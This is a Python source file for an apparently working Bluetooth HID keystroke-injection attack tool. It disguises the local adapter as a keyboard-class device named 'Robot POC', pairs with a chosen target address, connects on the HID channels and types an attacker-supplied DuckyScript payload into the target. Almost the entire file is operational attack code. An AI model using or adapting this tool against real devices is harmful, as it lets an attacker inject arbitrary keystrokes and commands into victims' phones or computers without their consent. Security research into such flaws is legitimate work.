import binascii
import bluetooth
import logging as log
import sys
import time
from multiprocessing import Process
from pydbus import SystemBus
from enum import Enum

from utils.menu_functions import (main_menu, read_duckyscript, 
                                  run, restart_bluetooth_daemon, get_target_address)
from utils.register_device import register_hid_profile, agent_loop

child_processes = []

class ConnectionFailureException(Exception):
    pass

class Adapter:
    def __init__(self, iface):
        self.iface = iface
        self.bus = SystemBus()
        self.adapter = self._get_adapter(iface)

    def _get_adapter(self, iface):
        try:
            return self.bus.get("org.bluez", f"/org/bluez/{iface}")
        except KeyError:
            log.error(f"Unable to find adapter '{iface}', aborting.")
            raise ConnectionFailureException("Adapter not found")

    def _run_command(self, command):
        result = run(command)
        if result.returncode != 0:
            raise ConnectionFailureException(f"Failed to execute command: {' '.join(command)}. Error: {result.stderr}")

    def set_property(self, prop, value):
        # Convert value to string if it's not
        value_str = str(value) if not isinstance(value, str) else value
        command = ["sudo", "hciconfig", self.iface, prop, value_str]
        self._run_command(command)

        # Verify if the property is set correctly
        verify_command = ["hciconfig", self.iface, prop]
        verification_result = run(verify_command)
        if value_str not in verification_result.stdout:
            log.error(f"Unable to set adapter {prop}, aborting. Output: {verification_result.stdout}")
            raise ConnectionFailureException(f"Failed to set {prop}")

    def power(self, powered):
        self.adapter.Powered = powered

    def reset(self):
        self.power(False)
        self.power(True)

    def enable_ssp(self):
        try:
            # Command to enable SSP - the actual command might differ
            # This is a placeholder command and should be replaced with the actual one.
            ssp_command = ["sudo", "hciconfig", self.iface, "sspmode", "1"]
            ssp_result = run(ssp_command)
            if ssp_result.returncode != 0:
                log.error(f"Failed to enable SSP: {ssp_result.stderr}")
                raise ConnectionFailureException("Failed to enable SSP")
        except Exception as e:
            log.error(f"Error enabling SSP: {e}")
            raise

class PairingAgent:
    def __init__(self, iface, target_addr):
        self.iface = iface
        self.target_addr = target_addr
        dev_name = "dev_%s" % target_addr.upper().replace(":", "_")
        self.target_path = "/org/bluez/%s/%s" % (iface, dev_name)

    def __enter__(self):
        try:
            log.debug("Starting agent process...")
            self.agent = Process(target=agent_loop, args=(self.target_path,))
            self.agent.start()
            time.sleep(0.25)
            log.debug("Agent process started.")
            return self
        except Exception as e:
            log.error(f"Error starting agent process: {e}")
            raise

    def __exit__(self, exc_type, exc_val, exc_tb):
        try:
            log.debug("Terminating agent process...")
            self.agent.kill()
            time.sleep(0.25)
            log.debug("Agent process terminated.")
        except Exception as e:
            log.error(f"Error terminating agent process: {e}")
            raise

class L2CAPConnectionManager:
    def __init__(self, target_address):
        self.target_address = target_address
        self.clients = {}

    def create_connection(self, port):
        client = L2CAPClient(self.target_address, port)
        self.clients[port] = client
        return client

    def connect_all(self):
        try:
            return sum(client.connect() for client in self.clients.values())
        except ConnectionFailureException as e:
            log.error(f"Connection failure: {e}")
            raise

    def close_all(self):
        for client in self.clients.values():
            client.close()

class L2CAPClient:
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.connected = False
        self.sock = None

    def encode_keyboard_input(*args):
      keycodes = []
      flags = 0
      for a in args:
        if isinstance(a, Key_Codes):
          keycodes.append(a.value)
        elif isinstance(a, Modifier_Codes):
          flags |= a.value
      assert(len(keycodes) <= 7)
      keycodes += [0] * (7 - len(keycodes))
      report = bytes([0xa1, 0x01, flags, 0x00] + keycodes)
      return report

    def close(self):
        if self.connected:
            self.sock.close()
        self.connected = False
        self.sock = None

    def send(self, data):
        if not self.connected:
            log.error("[TX] Not connected")
            return

        log.debug(f"[TX-{self.port}] Attempting to send data: {binascii.hexlify(data).decode()}")
        if self.attempt_send(data, 0.001):
            log.debug(f"[TX-{self.port}] Data sent successfully")
        else:
            log.error(f"[TX-{self.port}] ERROR! Timed out sending data")

    def attempt_send(self, data, timeout):
        start = time.time()
        while time.time() - start < timeout:
            try:
                self.sock.send(data)
                return True
            except bluetooth.btcommon.BluetoothError as ex:
                if ex.errno != 11:  # no data available
                    raise ex
                time.sleep(0.001)
            except Exception as ex:
                log.error(f"[TX-{self.port}] Exception: {ex}")
                self.connected = False
        return False

    def recv(self, timeout=0):
        start = time.time()
        while True:
            raw = None
            if not self.connected:
                return None
            if self.sock is None:
                return None
            try:
                raw = self.sock.recv(64)
                if len(raw) == 0:
                    self.connected = False
                    return None
                log.debug(f"[RX-{self.port}] Received data: {binascii.hexlify(raw).decode()}")
            except bluetooth.btcommon.BluetoothError as ex:
                if ex.errno != 11:  # no data available
                    raise ex
                else:
                    if (time.time() - start) < timeout:
                        continue
            return raw

    def connect(self, timeout=None):
        log.debug(f"Attempting to connect to {self.addr} on port {self.port}")
        log.debug("connecting to %s on port %d" % (self.addr, self.port))
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(timeout)
        try:
            sock.connect((self.addr, self.port))
            sock.setblocking(0)
            self.sock = sock
            self.connected = True
            log.debug("SUCCESS! connected on port %d" % self.port)
        except Exception as ex:
            self.connected = False
            log.error("ERROR connecting on port %d: %s" % (self.port, ex))
            raise ConnectionFailureException(f"Connection failure on port {self.port}")

        return self.connected

    def send_keyboard_report(self, *args):
        self.send(self.encode_keyboard_input(*args))

    def send_keypress(self, *args, delay=0.01):
        if args:
            log.debug(f"Attempting to send... {args}")
            self.send(self.encode_keyboard_input(*args))
        else:
            # If no arguments, send an empty report to release keys
            self.send(self.encode_keyboard_input())
        time.sleep(delay)

    def send_keyboard_combination(self, modifier, key, delay=0.01):
        # Press the combination
        press_report = self.encode_keyboard_input(modifier, key)
        self.send(press_report)
        time.sleep(delay)  # Delay to simulate key press
    
        # Release the combination
        release_report = self.encode_keyboard_input()
        self.send(release_report)
        time.sleep(delay)

def process_duckyscript(client, duckyscript):
    client.send_keypress('')  # Send empty report
    time.sleep(0.5)

    shift_required_characters = "!@#$%^&*()_+{}|:\"<>?ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    for line in duckyscript:
        line = line.strip()
        if not line or line.startswith("REM"):
            continue

        if line.startswith("STRING"):
            text = line[7:]
            for char in text:
                try:
                    if char.isdigit():
                        key_code = getattr(Key_Codes, f"_{char}")
                        client.send_keypress(key_code)
                    elif char == " ":
                        client.send_keypress(Key_Codes.SPACE)
                    elif char == "[":
                        client.send_keypress(Key_Codes.LEFTBRACE)
                    elif char == "]":
                        client.send_keypress(Key_Codes.RIGHTBRACE)
                    elif char == ";":
                        client.send_keypress(Key_Codes.SEMICOLON)
                    elif char == "'":
                        client.send_keypress(Key_Codes.QUOTE)
                    elif char == "/":
                        client.send_keypress(Key_Codes.SLASH)
                    elif char == ".":
                        client.send_keypress(Key_Codes.DOT)
                    elif char == ",":
                        client.send_keypress(Key_Codes.COMMA)
                    elif char == "|":
                        client.send_keypress(Key_Codes.PIPE)
                    elif char == "-":
                        client.send_keypress(Key_Codes.MINUS)
                    elif char == "=":
                        client.send_keypress(Key_Codes.EQUAL)
                    elif char in shift_required_characters:
                        key_code_str = char_to_key_code(char)
                        if key_code_str:
                            key_code = getattr(Key_Codes, key_code_str)
                            client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
                        else:
                            log.warning(f"Unsupported character '{char}' in Duckyscript")
                    elif char.isalpha():
                        key_code = getattr(Key_Codes, char.lower())
                        if char.isupper():
                            client.send_keyboard_combination(Modifier_Codes.SHIFT, key_code)
                        else:
                            client.send_keypress(key_code)
                    else:
                        key_code = char_to_key_code(char)
                        if key_code:
                            client.send_keypress(key_code)
                        else:
                            log.warning(f"Unsupported character '{char}' in Duckyscript")

                    client.send_keypress()  # Release after each key press
                except AttributeError as e:
                    log.warning(f"Attribute error: {e} - Unsupported character '{char}' in Duckyscript")

        elif any(mod in line for mod in ["SHIFT", "ALT", "CTRL", "GUI", "COMMAND", "WINDOWS"]):
            # Process modifier key combinations
            components = line.split()
            if len(components) == 2:
                modifier, key = components
                try:
                    # Convert to appropriate enums
                    modifier_enum = getattr(Modifier_Codes, modifier.upper())
                    key_enum = getattr(Key_Codes, key.lower())
                    client.send_keyboard_combination(modifier_enum, key_enum)
                    log.debug(f"Sent combination: {line}")
                except AttributeError:
                    log.warning(f"Unsupported combination: {line}")
            else:
                log.warning(f"Invalid combination format: {line}")

def char_to_key_code(char):
    # Mapping for special characters that always require SHIFT
    shift_char_map = {
        '!': 'EXCLAMATION_MARK',
        '@': 'AT_SYMBOL',
        '#': 'HASHTAG',
        '$': 'DOLLAR',
        '%': 'PERCENT_SYMBOL',
        '^': 'CARET_SYMBOL',
        '&': 'AMPERSAND_SYMBOL',
        '*': 'ASTERISK_SYMBOL',
        '(': 'OPEN_PARENTHESIS',
        ')': 'CLOSE_PARENTHESIS',
        '_': 'UNDERSCORE_SYMBOL',
        '+': 'KEYPADPLUS',
	    '{': 'LEFTBRACE',
	    '}': 'RIGHTBRACE',
	    ':': 'SEMICOLON',
	    '\\': 'BACKSLASH',
	    '"': 'QUOTE',
        '<': 'COMMA',
        '>': 'DOT',
	    '?': 'QUESTIONMARK',
	    'A': 'a',
	    'B': 'b',
	    'C': 'c',
	    'D': 'd',
	    'E': 'e',
	    'F': 'f',
	    'G': 'g',
	    'H': 'h',
	    'I': 'i',
	    'J': 'j',
	    'K': 'k',
	    'L': 'l',
	    'M': 'm',
	    'N': 'n',
	    'O': 'o',
	    'P': 'p',
	    'Q': 'q',
	    'R': 'r',
	    'S': 's',
	    'T': 't',
	    'U': 'u',
	    'V': 'v',
	    'W': 'w',
	    'X': 'x',
	    'Y': 'y',
	    'Z': 'z',
	
    }
    return shift_char_map.get(char)

# Key codes for modifier keys
class Modifier_Codes(Enum):
    CTRL = 0x01
    RIGHTCTRL = 0x10

    SHIFT = 0x02
    RIGHTSHIFT = 0x20

    ALT = 0x04
    RIGHTALT = 0x40

    GUI = 0x08
    WINDOWS = 0x08
    COMMAND = 0x08
    RIGHTGUI = 0x80

class Key_Codes(Enum):
    NONE = 0x00
    a = 0x04
    b = 0x05
    c = 0x06
    d = 0x07
    e = 0x08
    f = 0x09
    g = 0x0a
    h = 0x0b
    i = 0x0c
    j = 0x0d
    k = 0x0e
    l = 0x0f
    m = 0x10
    n = 0x11
    o = 0x12
    p = 0x13
    q = 0x14
    r = 0x15
    s = 0x16
    t = 0x17
    u = 0x18
    v = 0x19
    w = 0x1a
    x = 0x1b
    y = 0x1c
    z = 0x1d
    _1 = 0x1e
    _2 = 0x1f
    _3 = 0x20
    _4 = 0x21
    _5 = 0x22
    _6 = 0x23
    _7 = 0x24
    _8 = 0x25
    _9 = 0x26
    _0 = 0x27
    ENTER = 0x28
    ESCAPE = 0x29
    BACKSPACE = 0x2a
    TAB = 0x2b
    SPACE = 0x2c
    MINUS = 0x2d
    EQUAL = 0x2e
    LEFTBRACE = 0x2f
    RIGHTBRACE = 0x30
    CAPSLOCK = 0x39
    VOLUME_UP = 0xed
    VOLUME_DOWN = 0xee
    SEMICOLON = 0x33
    COMMA = 0x36
    PERIOD = 0x37
    SLASH = 0x38
    PIPE = 0x31
    BACKSLASH = 0x31
    GRAVE = 0x35
    APOSTROPHE = 0x34
    LEFT_BRACKET = 0x2f
    RIGHT_BRACKET = 0x30
    DOT = 0x37

    # SHIFT KEY MAPPING
    EXCLAMATION_MARK = 0x1e
    AT_SYMBOL = 0x1f
    HASHTAG = 0x20
    DOLLAR = 0x21
    PERCENT_SYMBOL = 0x22
    CARET_SYMBOL = 0x23
    AMPERSAND_SYMBOL = 0x24
    ASTERISK_SYMBOL = 0x25
    OPEN_PARENTHESIS = 0x26
    CLOSE_PARENTHESIS = 0x27
    UNDERSCORE_SYMBOL = 0x2d
    QUOTE = 0x34
    QUESTIONMARK = 0x38
    KEYPADPLUS = 0x57

def terminate_child_processes():
    for proc in child_processes:
        if proc.is_alive():
            proc.terminate()
            proc.join()

def setup_bluetooth(target_address):
    restart_bluetooth_daemon()
    profile_proc = Process(target=register_hid_profile, args=('hci0', target_address))
    profile_proc.start()
    child_processes.append(profile_proc)
    adapter = Adapter('hci0')
    adapter.set_property("name", "Robot POC")
    adapter.set_property("class", 0x002540)
    adapter.power(True)
    return adapter

def initialize_pairing(agent_iface, target_address):
    try:
        with PairingAgent(agent_iface, target_address) as agent:
            log.debug("Pairing agent initialized")
    except Exception as e:
        log.error(f"Failed to initialize pairing agent: {e}")
        raise ConnectionFailureException("Pairing agent initialization failed")

def establish_connections(connection_manager):
    if not connection_manager.connect_all():
        raise ConnectionFailureException("Failed to connect to all required ports")

# Main function
def main():
    log.basicConfig(level=log.DEBUG)
    main_menu()
    target_address = get_target_address()
    if not target_address:
        log.info("No target address provided. Exiting.")
        return

    duckyscript = read_duckyscript()
    if not duckyscript:
        log.info("Payload file not found. Exiting.")
        return

    adapter = setup_bluetooth(target_address)
    adapter.enable_ssp()

    try:
        connection_manager = L2CAPConnectionManager(target_address)
        connection_manager.create_connection(1)   # SDP
        connection_manager.create_connection(17)  # HID Control
        connection_manager.create_connection(19)  # HID Interrupt

        initialize_pairing('hci0', target_address)
        establish_connections(connection_manager)
        hid_interrupt_client = connection_manager.clients[19]
        process_duckyscript(hid_interrupt_client, duckyscript)
    except ConnectionFailureException as e:
        log.error(f"Connection failure: {e}")
        terminate_child_processes()
        sys.exit("Exiting script due to connection failure")

if __name__ == "__main__":
    try:
        main()
    finally:
        terminate_child_processes()
